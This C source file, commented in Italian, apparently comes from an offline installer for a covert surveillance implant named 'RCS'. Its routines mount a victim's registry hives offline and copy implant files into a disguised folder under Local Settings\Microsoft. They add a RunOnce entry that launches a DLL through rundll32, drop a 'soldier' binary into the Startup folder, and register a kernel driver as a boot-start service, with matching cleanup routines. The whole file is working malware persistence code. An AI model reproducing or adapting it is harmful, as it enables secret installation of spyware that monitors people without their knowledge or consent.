#include "stdafx.h"
#include "Functions_Users.h"
#include "Functions_RCS.h"
#include "commons.h"

BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR tmp_path[MAX_PATH*2];
	WCHAR tmp_path2[MAX_PATH*2];
	HANDLE hFind;
	WIN32_FIND_DATA file_info;

	// Se puo' installare solo il soldier
	if (os_info->is_blacklisted == BL_ALLOWSOLDIER) {
		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\%s", rcs_info->rcs_files_path, rcs_info->soldier_name);
		swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
		return CopyFile(tmp_path, tmp_path2, FALSE);
	}

	// Continua se deve installare l'elite...

	// Crea la directory nuova
	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft", user_info->user_home, user_info->user_local_settings);
	CreateDirectory(tmp_path, NULL);
	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
	ClearAttributes(tmp_path);
	if (!CreateDirectory(tmp_path, NULL) && (GetLastError()!=ERROR_ALREADY_EXISTS)) 
		return FALSE;

	// Copia i file 
	swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\*.*", rcs_info->rcs_files_path);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
			swprintf_s(tmp_path2, MAX_PATH, L"%s%s\\Microsoft\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir, file_info.cFileName);
			ClearAttributes(tmp_path2);
			if (!CopyFile(tmp_path, tmp_path2, FALSE)) {
				FindClose(hFind);
				return FALSE;
			}
			SetFileAttributes(tmp_path2, FILE_ATTRIBUTE_NORMAL);
		} while (FindNextFile(hFind, &file_info));
		if (GetLastError() != ERROR_NO_MORE_FILES) {
			FindClose(hFind);
			return FALSE;
		}
		FindClose(hFind);
	} else
		return FALSE;

	// Scrive la chiave nel registry
	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%s%s", user_info->user_home, L"\\ntuser.dat");
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\", tmp_path) != ERROR_SUCCESS) 
		return FALSE;

	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%%SystemRoot%%\\system32\\rundll32.exe \"%%USERPROFILE%%%s\\Microsoft\\%s\\%s\",%s", user_info->user_local_settings, rcs_info->new_hdir, rcs_info->hcore, rcs_info->func_name);
	if (RegSetKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", rcs_info->hreg, REG_EXPAND_SZ, tmp_path, (wcslen(tmp_path)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
		return FALSE;
	}

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
	return TRUE;
}



BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
{
	WCHAR tmp_path[MAX_PATH*2];
	HANDLE hFind;
	WIN32_FIND_DATA file_info;
	BOOL ret_val = TRUE;
	HRESULT reg_ret1, reg_ret2, reg_ret3;

	// Cancella tutti i file (nuova e vecchia directory)
	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s\\*.*", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir, file_info.cFileName);
			ClearAttributes(tmp_path);
			DeleteFile(tmp_path);
		} while (FindNextFile(hFind, &file_info));
		FindClose(hFind);
		// Cancella la directory
		swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
		ClearAttributes(tmp_path);
		if (!RemoveDirectory(tmp_path))
			ret_val = FALSE;
	}

	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s\\*.*", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);
	hFind = FindFirstFile(tmp_path, &file_info);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			// Salta le directory (es: ".", ".." etc...)
			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;
			swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir, file_info.cFileName);
			ClearAttributes(tmp_path);
			DeleteFile(tmp_path);
		} while (FindNextFile(hFind, &file_info));
		FindClose(hFind);
		// Cancella la directory
		swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);
		ClearAttributes(tmp_path);
		if (!RemoveDirectory(tmp_path))
			ret_val = FALSE;
	}

	// Cancella un eventuale Soldier
	swprintf_s(tmp_path, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
	ClearAttributes(tmp_path);
	DeleteFile(tmp_path);

	// Cancella la chiave nel registry
	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%s%s", user_info->user_home, L"\\ntuser.dat");
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\", tmp_path) != ERROR_SUCCESS) 
		return FALSE;

	reg_ret1 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", rcs_info->hreg);
	reg_ret2 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", rcs_info->hreg);
	reg_ret3 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", rcs_info->old_hreg);
	if ( reg_ret1!=ERROR_SUCCESS && reg_ret2!=ERROR_SUCCESS && reg_ret3!=ERROR_SUCCESS) {
		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
		return FALSE;
	}

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
	return ret_val;
}


BOOL WIN_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list)
{
	WCHAR src_drv[MAX_PATH];
	WCHAR dest_drv[MAX_PATH];
	WCHAR *subkey;
	BOOL ret_val = TRUE;
	DWORD i, dwvalue;
	HKEY hreg;

	if (!os_info || !rcs_info)
		return FALSE;

	// XXX Installa il driver solo se non siamo su 2000
	if (!wcscmp(os_info->curr_ver, L"5.0"))
		return TRUE; // Non fa comparire il messaggio di errore

	if (os_info->arch == 32)
		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, rcs_info->hdrv);
	else
		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, rcs_info->hdrv64);

	swprintf_s(dest_drv, sizeof(dest_drv)/sizeof(dest_drv[0]), L"%s%s\\drivers\\%s", os_info->drive, os_info->system_root, rcs_info->hsys);

	ClearAttributes(dest_drv);
	if (!CopyFile(src_drv, dest_drv, FALSE))
		return FALSE;
	SetFileAttributes(dest_drv, FILE_ATTRIBUTE_NORMAL);
	swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s%s%s", os_info->drive, os_info->system_root, L"\\config\\system");
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\", src_drv) != ERROR_SUCCESS) 	
		return FALSE;
	
	for(i=0;;i++) {
		if (!RegEnumSubKey(L"RCS_SYSTEM\\", i, &subkey))
			break;

		// Vede se è un ControlSet
		if (_wcsnicmp(subkey, L"ControlSet", wcslen(L"ControlSet"))) {
			SAFE_FREE(subkey);
			continue;
		}

		// Scrive la chiave
		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"RCS_SYSTEM\\%s\\Services\\%s", subkey, rcs_info->hsys);
		SAFE_FREE(subkey);
		if (RegCreateKey(HKEY_LOCAL_MACHINE, src_drv, &hreg) == ERROR_SUCCESS) {
			RegCloseKey(hreg);
			dwvalue = 0;
			if (RegSetKeyValue(HKEY_LOCAL_MACHINE, src_drv, L"ErrorControl", REG_DWORD, &dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				continue;
			}
			dwvalue = 1;
			if (RegSetKeyValue(HKEY_LOCAL_MACHINE, src_drv, L"Start", REG_DWORD, &dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				continue;
			}
			if (RegSetKeyValue(HKEY_LOCAL_MACHINE, src_drv, L"Type", REG_DWORD, &dwvalue, sizeof(dwvalue)) != ERROR_SUCCESS) {
				ret_val = FALSE;
				continue;
			}
			if (RegSetKeyValue(HKEY_LOCAL_MACHINE, src_drv, L"DisplayName", REG_SZ, rcs_info->hsys, (wcslen(rcs_info->hsys)+1)*sizeof(rcs_info->hsys[0])) != ERROR_SUCCESS) {
				ret_val = FALSE;
				continue;
			}
			swprintf_s(dest_drv, sizeof(dest_drv)/sizeof(dest_drv[0]), L"system32\\drivers\\%s", rcs_info->hsys);
			if (RegSetKeyValue(HKEY_LOCAL_MACHINE, src_drv, L"ImagePath", REG_SZ, dest_drv, (wcslen(dest_drv)+1)*sizeof(dest_drv[0])) != ERROR_SUCCESS) {
				ret_val = FALSE;
				continue;
			}

		} else
			ret_val = FALSE;
	}

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
	return ret_val;
}


BOOL WIN_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list, DWORD installation_count)
{
	WCHAR src_drv[MAX_PATH];
	WCHAR dest_drv[MAX_PATH];
	WCHAR *subkey;
	BOOL ret_val = TRUE;
	DWORD i;

	if (!os_info || !rcs_info || installation_count!=0)
		return FALSE;

	swprintf_s(dest_drv, sizeof(dest_drv)/sizeof(dest_drv[0]), L"%s%s\\drivers\\%s", os_info->drive, os_info->system_root, rcs_info->hsys);
	ClearAttributes(dest_drv);
	if (!DeleteFile(dest_drv))
		ret_val = FALSE;

	swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"%s%s%s", os_info->drive, os_info->system_root, L"\\config\\system");
	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\", src_drv) != ERROR_SUCCESS) 	
		return FALSE;
	
	for(i=0;;i++) {
		if (!RegEnumSubKey(L"RCS_SYSTEM\\", i, &subkey))
			break;

		// Vede se è un ControlSet
		if (_wcsnicmp(subkey, L"ControlSet", wcslen(L"ControlSet"))) {
			SAFE_FREE(subkey);
			continue;
		}

		// Cancella le chiavi
		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"RCS_SYSTEM\\%s\\Services\\%s", subkey, rcs_info->hsys);
		RegDeleteTree(HKEY_LOCAL_MACHINE, src_drv);
		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"RCS_SYSTEM\\%s\\Enum\\Root\\LEGACY_%s", subkey, rcs_info->hsys);
		RegDeleteTree(HKEY_LOCAL_MACHINE, src_drv);

		SAFE_FREE(subkey);
	}

	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
	return ret_val;
}

void WIN_GetSourceFileDirectory(users_struct_t *curr_user, rcs_struct_t *rcs_info, WCHAR *src_path)
{
	HANDLE hfile;
	// Da' la preferenza al nuovo path
	swprintf_s(src_path, MAX_PATH, L"%s%s\\Microsoft\\%s", curr_user->user_home, curr_user->user_local_settings, rcs_info->new_hdir);
	hfile = CreateFile(src_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return;
	}

	swprintf_s(src_path, MAX_PATH, L"%s%s\\%s", curr_user->user_home, curr_user->user_local_settings, rcs_info->hdir);
}